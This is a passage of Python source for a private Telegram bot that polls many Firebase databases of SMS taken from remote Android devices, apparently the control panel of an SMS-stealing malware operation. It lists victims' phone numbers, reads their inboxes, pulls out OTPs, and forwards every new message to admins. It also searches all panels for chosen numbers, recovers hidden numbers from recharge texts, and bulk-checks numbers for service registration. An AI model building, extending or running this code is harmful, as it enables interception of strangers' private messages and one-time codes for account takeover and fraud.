            service_used = parts[2] if len(parts) > 2 else ""

            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            
            if not device:
                await query.answer("Device not found in active list! Refresh karein.", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            smss  = await get_device_sms(device)
            
            if service_used.startswith("f30_"):
                page = service_used.split("_")[1]
                back_btn = InlineKeyboardButton("🔙 Back to List", callback_data=f"f30:{page}")
            elif service_used:
                back_btn = InlineKeyboardButton("🔙 Back to Checker", callback_data=f"auto_fb:{service_used}")
            else:
                back_btn = InlineKeyboardButton("🔙 Back to Home", callback_data="home")
                
            refresh_btn = InlineKeyboardButton("🔄 Refresh Inbox", callback_data=data)
            
            if not smss:
                await safe_edit(query, f"📭 **Inbox Empty**\n📱 Number: {label}\n\nAgar aapne OTP send kiya hai, toh 5-10 second wait karein aur **Refresh Inbox** par click karein.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="Markdown")
                return
                
            header = f"📩 ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\n📱 Number: {label}\n📄 Showing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons, has_otp = [], [], False
            
            for sms in smss:
                block, otp = format_sms_block(sms, label)
                body_parts.append(block)
                if otp:
                    has_otp = True
                    otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            
            if has_otp: 
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
                save_user(chat_id)
                
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[more SMS available]"
            
            otp_buttons.append([refresh_btn, back_btn])
            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
            return

        if data.startswith("info:"):
            dev_id = data[5:]
            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            
            if not device:
                await query.answer("Device not found!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n"
            for i, num in enumerate(device.numbers, 1): text += f"SIM {i}   : {num}\n"
            if device.device_info: text += f"\n{device.device_info}\n"
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("View Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Back", callback_data=f"sel:{dev_id}")],
                [InlineKeyboardButton("Disconnect & Back",  callback_data="home")],
            ])
            await safe_edit(query, text, reply_markup=kb)
            return

    except Exception as e:
        tlog(f"Callback error [{data}]: {e}")
        try: await query.answer("An error occurred, please try again.", show_alert=True)
        except: pass

# ═══════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER (STRICT ACCESS CONTROL)
# ═══════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text    = (update.message.text or "").strip()
    bot_token = ctx.bot.token

    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("You do not have access to this private bot. 🚫")
        return

    users_db = all_users
    if is_spamming(chat_id): return

    if text == "🔥 30-Min Fresh Devices":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        
        wait_msg = await update.message.reply_text("⏳ **Fetching 30-Min Fresh Devices...**", parse_mode="Markdown")
        
        all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        if not all_devices:
            all_devices = await get_all_devices(bot_token, chat_id, users_db)
        
        recent_ping = []
        for d in all_devices:
            if d.numbers and d.status == "online":
                ts = d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000
                if (time.time() - ts) <= 3600:
                    recent_ping.append(d)
        
        recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
        
        valid_devs = []
        for i in range(0, min(100, len(recent_ping)), 15):
            batch = recent_ping[i:i+15]
            verifications = await asyncio.gather(*[verify_recent_sms(d, 1800) for d in batch])
            for d, is_valid in zip(batch, verifications):
                if is_valid:
                    valid_devs.append(d.id)
            if len(valid_devs) >= 25: 
                break
                
        if not valid_devs:
            await wait_msg.edit_text("❌ Koi bhi online number par pichle 30 minutes me naya SMS nahi aaya hai.")
            return
            
        user_fresh_cache[chat_id] = valid_devs
        await show_fresh30_page(wait_msg, chat_id, 0, bot_token, users_db)
        return

    if text == "Manual Checker":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
        return

    if text == "Auto-Check Panels":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
        return

    if text.startswith("Add Panel"):
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action[chat_id] = {"action": "set_personal_db"}
        await update.message.reply_text("ADD CUSTOM PANEL\n━━━━━━━━━━━━━━━━━━\nApne sabhi Firebase URLs bhejein (enter daba kar naye line me likhein):\n\nCancel: /cancel")
        return

    if text.startswith("Global Spam"):
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        current_state = users_db.get(chat_id, {}).get("global_spam", False)
        users_db[chat_id]["global_spam"] = not current_state
        save_user(chat_id)
        
        new_state = "ON" if not current_state else "OFF"
        if new_state == "ON":
            await update.message.reply_text("GOD MODE ENABLED!\n\nAb aapko saare default panels aur saare users ke personal panels se sabhi SMS/OTPs lagatar yahan milenge.", reply_markup=get_reply_menu(chat_id))
        else:
            await update.message.reply_text(f"Global Spam Mode is now OFF.", reply_markup=get_reply_menu(chat_id))
        return

    if text == "Super Admin":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
            [InlineKeyboardButton("Force Backup DB", callback_data="sa_backup")],
            [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
            [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
            [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
            [InlineKeyboardButton("Close", callback_data="close_msg")]
        ])
        await update.message.reply_text("SUPER ADMIN MENU\nChoose an advanced option:", reply_markup=kb)
        return

    if text == "Devices List":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        
        # 🔥 INSTANT UI FIX FOR BUTTON CLICKS
        wait_msg = await update.message.reply_text("⏳ **Loading Devices List...**", parse_mode="Markdown")
        
        devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        if not devices:
            devices = await get_all_devices(bot_token, chat_id, users_db)
            
        await safe_edit(wait_msg, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
        return

    if text == "Select Panel":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        kb = [
            [InlineKeyboardButton("All Panels", callback_data="set_panel:ALL")],
            [InlineKeyboardButton("Default Panels (Server)", callback_data="set_panel:DEFAULT")],
            [InlineKeyboardButton("My Custom Panels", callback_data="set_panel:CUSTOM")],
            [InlineKeyboardButton("Close", callback_data="close_msg")]
        ]
        await update.message.reply_text("PANEL SELECTION\n━━━━━━━━━━━━━━━━━━\nAap kaunse panels se devices dekhna chahte hain? Niche select karein:", reply_markup=InlineKeyboardMarkup(kb))
        return

    if text == "Search Number (God)":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action[chat_id] = {"action": "search_number"}
        await update.message.reply_text("SEARCH NUMBER (GOD MODE)\n━━━━━━━━━━━━━━━━━━\nType the number you want to find below. Multiple numbers allowed (like 919876543210 9876543210):\n\nCancel: /cancel")
        return

    if text == "Scan Hidden Devices":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        wait_msg = await update.message.reply_text("Scanning premium hidden devices (Searching 'Recharge/Validity')...\n\nChecking active devices, please wait...")
        
        devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        if not devices:
            devices = await get_all_devices(bot_token, 0, users_db)
            
        target_devices = [d for d in devices if not d.numbers]
        
        if not target_devices:
            await wait_msg.edit_text("Sabhi devices me already numbers linked hain. Koi hidden number wala device nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            return
            
        results = []
        kb = []
        phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
        
        found_count = 0
        for d in target_devices[:100]: 
            smss = await get_device_sms(d, limit=10)
            found_nums = set()
            sample_sms = ""
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                if any(x in body.lower() for x in ["recharge", "validity", "balance"]):
                    matches = phone_pattern.findall(body)
                    for m in matches:
                        found_nums.add(m)
                        if not sample_sms:
                            sample_sms = body[:40].replace('\n', ' ') + "..."
            
            if found_nums:
                found_count += 1
                results.append(f"Device: {d.name} ({d.id[:6]})\nPossible Nums: {', '.join(found_nums)}\nSMS: {sample_sms}\n")
                if len(kb) < 90: 
                    kb.append([InlineKeyboardButton(f"View Inbox: {list(found_nums)[0][:5]}...", callback_data=f"msgs:{d.id}")])
                    
        if found_count == 0:
            await wait_msg.edit_text("Scanning complete. Koi active recharge wala hidden number nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]))
            return
            
        kb.append([InlineKeyboardButton("Back to Home", callback_data="home")])
        results_text = "DEEP SCAN RESULTS (Premium)\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
        if len(results_text) > 4000: results_text = results_text[:4000] + "\n\n...[Truncated]"
        
        await wait_msg.edit_text(results_text, reply_markup=InlineKeyboardMarkup(kb))
        return

    if text == "Admin Panel":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text(admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
        return

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            await update.message.reply_text("Action cancelled.", reply_markup=get_reply_menu(chat_id))
        else:
            await update.message.reply_text("No pending action to cancel.")
        return

    state = pending_action.get(chat_id)
    if not state: return

    action = state.get("action")
    
    if action == "check_number_input":
        raw_nums = re.sub(r"\D", " ", text).split()
        target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
        
        if not target_nums:
            await update.message.reply_text("❌ Invalid input! Koi valid 10-digit Indian number nahi mila.")
            return
        
        service = state["service"]
        pending_action.pop(chat_id)
        
        if len(target_nums) == 1:
            number = target_nums[0]
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...")
            res = await check_number_api(service, number)
            
            is_error = res.get("status") == "error"
            ms = res.get("ms", 0)
            is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
            
            res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
            
            kb = []
            if not is_reg and not is_error:
                kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])

            kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
            await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        else:
            total_bulk = len(target_nums)
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...")
            
            bulk_results = []
            registered_list = []
            BATCH_SIZE = 100 
            
            for i in range(0, total_bulk, BATCH_SIZE):
                batch = target_nums[i:i+BATCH_SIZE]
                tasks = [check_number_api(service, num) for num in batch]
                res_list = await asyncio.gather(*tasks, return_exceptions=True)
                
                for num, res in zip(batch, res_list):
                    if isinstance(res, Exception) or res.get("status") == "error":
                        bulk_results.append(f"❌ <code>{num}</code> - Error")
                        continue
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    stat = "Reg" if is_reg else "UNREG"
                    bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {stat}")
                    if is_reg:
                        registered_list.append(num)
                    
                await asyncio.sleep(0.5)
            
            res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
            if len(res_text) > 4000:
                res_text = res_text[:4000] + "\n...[Truncated]"
                
            kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
            await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
            
            if registered_list and chat_id in ADMIN_IDS:
                file_name = f"Registered_{service.upper()}_Bulk.txt"
                file_path = os.path.join(SYS_DIR, file_name)
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write("\n".join(list(set([f"+91{num[-10:]}" for num in registered_list]))))
                try: await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename=file_name, caption=f"📁 Bulk Check Registered Numbers ({service.upper()})")
                except: pass
                
        return

    if action == "sa_set_global_panel":
        pending_action.pop(chat_id)
        urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
        if not urls:
            await update.message.reply_text("Koi valid URL nahi mili. Kripya http/https se start hone wali link daalein.")
            return
            
        global_list = SETTINGS.get("global_panels", [])
        global_list.extend(urls)
        SETTINGS["global_panels"] = global_list
        save_settings()
        await update.message.reply_text(f"SUCCESS! {len(urls)} panels Global Default list me add ho gaye hain.")
        return

    if action == "set_personal_db":
        urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
        if not urls:
            await update.message.reply_text("Invalid URL. Starting with http/https bhejein.")
            return
            
        pending_action.pop(chat_id)
        expiry_time = time.time() + (86400 * 365) 
        
        for custom_url in urls:
            new_entry = {"url": custom_url, "expiry": expiry_time}
            users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append(new_entry)
        
        kb = [
            [InlineKeyboardButton("Run Own Panel Only", callback_data="set_panel:CUSTOM")],
            [InlineKeyboardButton("Run Pre-existing Only", callback_data="set_panel:DEFAULT")],
            [InlineKeyboardButton("Run Both Panels", callback_data="set_panel:ALL")]
        ]
        await update.message.reply_text(f"{len(urls)} Personal Firebase URLs bulk me add ho gaye!\n\nAb choose karein ki aapko kaunsa panel chalana hai:", reply_markup=InlineKeyboardMarkup(kb))
        return

    if action == "search_number":
        pending_action.pop(chat_id)
        search_terms = [re.sub(r"\D", "", t) for t in text.replace(",", " ").split() if len(re.sub(r"\D", "", t)) >= 4]
        
        if not search_terms:
            await update.message.reply_text("Enter at least 4 digits to search.")
            return
            
        wait_msg = await update.message.reply_text("Searching across all global and user databases...")
        devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
        if not devices:
            devices = await get_all_devices(bot_token, 0, users_db)
        
        found_devs = []
        for d in devices:
            for term in search_terms:
                if any(term in num for num in d.numbers):
                    found_devs.append(d)
                    break
        
        if not found_devs:
            await wait_msg.edit_text("No matching numbers found in any panel.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            return
            
        if len(found_devs) == 1:
            device = found_devs[0]
            user_focus.setdefault(bot_token, {})[chat_id] = device.id
            label = device_label(device)
            smss  = await get_device_sms(device)
            
            back_btn = InlineKeyboardButton("Back to Home", callback_data="home")
            
            if not smss:
                await wait_msg.edit_text(f"{label}\n\nKoi SMS nahi mili.", reply_markup=InlineKeyboardMarkup([[back_btn]]))
                return
                
            header = f"ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\nNumber: {label}\nShowing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons, has_otp = [], [], False
            
            for sms in smss:
                block, otp = format_sms_block(sms, label)
                body_parts.append(block)
                if otp:
                    has_otp = True
                    otp_buttons.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            
            if has_otp: 
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
                save_user(chat_id)
                
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[more SMS available]"
            otp_buttons.append([back_btn])
            await wait_msg.edit_text(full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
            return
            
        rows = []
        for d in found_devs[:10]:
            tag  = f"[{d.db_tag}] "
            icon = "🟢" if d.status == "online" else "🔴"
            lbl = f"{icon} {tag}{' & '.join(d.numbers)}"
            rows.append([InlineKeyboardButton(f"Messages: {lbl}", callback_data=f"msgs:{d.id}")])
            
        rows.append([InlineKeyboardButton("Back to Home", callback_data="home")])
        await wait_msg.edit_text(f"Search Results for: {', '.join(search_terms)}\nDirectly open inbox:", reply_markup=InlineKeyboardMarkup(rows))
        return

    if action == "broadcast_msg":
        pending_action.pop(chat_id)
        targets = chats_registry.get(bot_token, set())
        wait_msg = await update.message.reply_text(f"Broadcasting to {len(targets)} users...")
        
        async def send_bc(cid):
            if cid == chat_id: return False
            try:
                await _main_app.bot.send_message(cid, text)
                return True
            except:
                return False

        tasks = [send_bc(cid) for cid in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        sent = sum(1 for r in results if r is True)
        failed = len(targets) - sent - (1 if chat_id in targets else 0)
            
        await wait_msg.edit_text(f"BROADCAST COMPLETE\n━━━━━━━━━━━━━━━━━━\nSent    : {sent}\nFailed  : {failed}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_refresh")]]))
        return

# ═══════════════════════════════════════════════════════
#  FIREBASE AUTO-GEN WORKER POOL ENGINE
# ═══════════════════════════════════════════════════════

async def _forward_sms(device: Device, sms: dict) -> None:
    global total_otps_processed
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return

    total_otps_processed += 1
    label = device_label(device)
    otp   = extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    
    master_log_sms(", ".join(device.numbers) if device.numbers else device.id[:8], body, otp)
    
    kb_rows = []
    if otp: kb_rows.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
    kb_rows.append([
        InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{device.id}"),
        InlineKeyboardButton("Device Info",  callback_data=f"info:{device.id}"),
    ])
    markup = InlineKeyboardMarkup(kb_rows)

    send_tasks = []

    if _main_app:
        for adm in ADMIN_IDS:
            if adm in all_users and all_users[adm].get("global_spam"):
                if otp: 
                    all_users.setdefault(adm, {})["otp_count"] = all_users.get(adm, {}).get("otp_count", 0) + 1
                    save_user(adm)
                send_tasks.append(_main_app.bot.send_message(adm, msg_text, reply_markup=markup))

    for bot_token, chat_dict in list(user_focus.items()):
        app_to_use = _main_app
        users_db = all_users
        if not app_to_use: continue

        focused_chats = [cid for cid, did in chat_dict.items() if did == device.id and cid in ADMIN_IDS]
        target_chats = set(focused_chats)
        
        for chat_id in target_chats:
            if otp: 
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
                save_user(chat_id)
            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup))
            
    if send_tasks:
        await asyncio.gather(*send_tasks, return_exceptions=True)

# ── AUTO-GEN WORKER QUEUE LOGIC ──
WORK_QUEUE = asyncio.Queue()
ACTIVE_WORKERS = []
MAX_WORKERS = 50 

async def worker_auto_scaler():
    while True:
        q_size = WORK_QUEUE.qsize()
        target_workers = min(MAX_WORKERS, max(10, q_size // 2)) 
        
        while len(ACTIVE_WORKERS) < target_workers:
            task = asyncio.create_task(db_processor_worker())
            ACTIVE_WORKERS.append(task)
            
        await asyncio.sleep(2) 

async def db_processor_worker():
    while True:
        try:
            job_type, tag, url = await WORK_QUEUE.get()
            
            if job_type == "INIT":
                try:
                    devs = await fetch_db_data(tag, url)
                    GLOBAL_DEVICE_CACHE[tag] = devs
                except: pass
                
                r_main, r_user, r_root = await asyncio.gather(
                    fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url),
                    return_exceptions=True
                )
                for bulk in (r_main, r_user, r_root):
                    if not isinstance(bulk, dict): continue
                    for dev_id, sms_dict in bulk.items():
                        if not isinstance(sms_dict, dict): continue
                        for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
                            
                type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.sms_path.endswith("receivedSms")]
                if type4_devs:
                    async def init_t4(d: Device):
                        sms_dict = await fb_get(d.sms_path, d.base_url)
                        if isinstance(sms_dict, dict):
                            for k in sms_dict: seen_ids.add(seen_key(d.id, k))
                    await asyncio.gather(*(init_t4(d) for d in type4_devs), return_exceptions=True)

                global SCAN_PROGRESS
                SCAN_PROGRESS["completed"] += 1

            elif job_type == "CACHE_UPDATE":
                try:
                    devs = await fetch_db_data(tag, url)
                    GLOBAL_DEVICE_CACHE[tag] = devs
                except: pass

            elif job_type == "POLL":
                r_main, r_user, r_root = await asyncio.gather(
                    fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url),
                    return_exceptions=True
                )
                devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
                device_map = {d.id: d for d in devices_in_db}
                
                for bulk_data in (r_main, r_user, r_root):
                    if not isinstance(bulk_data, dict): continue
                    for dev_id, sms_dict in bulk_data.items():
                        if not isinstance(sms_dict, dict): continue
                        device = device_map.get(dev_id)
                        for k, sms in sms_dict.items():
                            if not isinstance(sms, dict): continue
                            sk = seen_key(dev_id, k)
                            if sk in seen_ids: continue
                            seen_ids.add(sk)
                            if device:
                                try: await _forward_sms(device, sms)
                                except: pass
                                    
                type4_devs = [d for d in devices_in_db if d.sms_path.endswith("receivedSms")]
                if type4_devs:
                    async def fetch_t4_sms(d: Device):
                        sms_dict = await fb_get(d.sms_path, d.base_url)
                        if isinstance(sms_dict, dict):
                            for k, sms in sms_dict.items():
                                if not isinstance(sms, dict): continue
                                sk = seen_key(d.id, k)
                                if sk in seen_ids: continue
                                seen_ids.add(sk)
                                try: await _forward_sms(d, sms)
                                except: pass
                    await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs), return_exceptions=True)
            
            if len(seen_ids) > 150000:
                seen_ids.clear()

            WORK_QUEUE.task_done()
            await asyncio.sleep(0.01) 
            
        except asyncio.CancelledError:
            break
        except Exception:
            pass

async def cache_compiler():
    """Compiles the ALL list separately so Telegram UI doesn't freeze."""
    while True:
        await asyncio.sleep(3) 
        all_devs = []
        for tag, list_devs in list(GLOBAL_DEVICE_CACHE.items()):
            if tag != "ALL": all_devs.extend(list_devs)
            
        n_map = {}
        for d in all_devs:
            if d.numbers:
                m = d.numbers[0]
                if m not in n_map or d.timestamp > n_map[m].timestamp:
                    n_map[m] = d
                    
        res = list(n_map.values())
        res.sort(key=lambda d: (0 if d.status == "online" else 1, -d.timestamp))
        GLOBAL_DEVICE_CACHE["ALL"] = res

async def master_dispatcher(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    while True:
        try:
            dbs_to_poll = dict(DATABASES)
            for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
                dbs_to_poll[f"G_{i}"] = g_url
                    
            for uid, uinfo in all_users.items():
                if uid in ADMIN_IDS:
                    for i, db_url in enumerate(get_user_dbs(uinfo)):
                        dbs_to_poll[f"U_{uid}_{i}"] = db_url
            
            if first_run:
                global SCAN_PROGRESS
                SCAN_PROGRESS = {"total": len(dbs_to_poll), "completed": 0}
                
                for tag, url in dbs_to_poll.items():
                    await WORK_QUEUE.put(("INIT", tag, url))
                
                first_run = False
                tlog(f"Private Bot Engine ready! Monitoring {len(dbs_to_poll)} Databases via Dynamic Workers...")
                print("\n✅ Bot started successfully. Listening for commands...\n")
            else:
                for tag, url in dbs_to_poll.items():
                    await WORK_QUEUE.put(("CACHE_UPDATE", tag, url))
                    await WORK_QUEUE.put(("POLL", tag, url))
                    
        except Exception: pass
        await asyncio.sleep(POLL_INTERVAL)

# ═══════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN: raise SystemExit("TOKEN is missing!")

    app = (
        Application.builder()
        .token(TOKEN)
        .connection_pool_size(100)
        .pool_timeout(60.0)
        .connect_timeout(60.0)
        .read_timeout(60.0)
        .write_timeout(60.0)
        .get_updates_read_timeout(60.0)
        .build()
    )

    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application) -> None:
        load_data()
        asyncio.create_task(worker_auto_scaler()) 
        asyncio.create_task(cache_compiler())
        asyncio.create_task(master_dispatcher(application))
        asyncio.create_task(auto_save_loop())

    app.post_init = post_init
    
    print(f"\n🚀 Starting the Ultra-Fast Bot Server... \n[*] Total unique databases loaded: {len(RAW_URLS)}")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
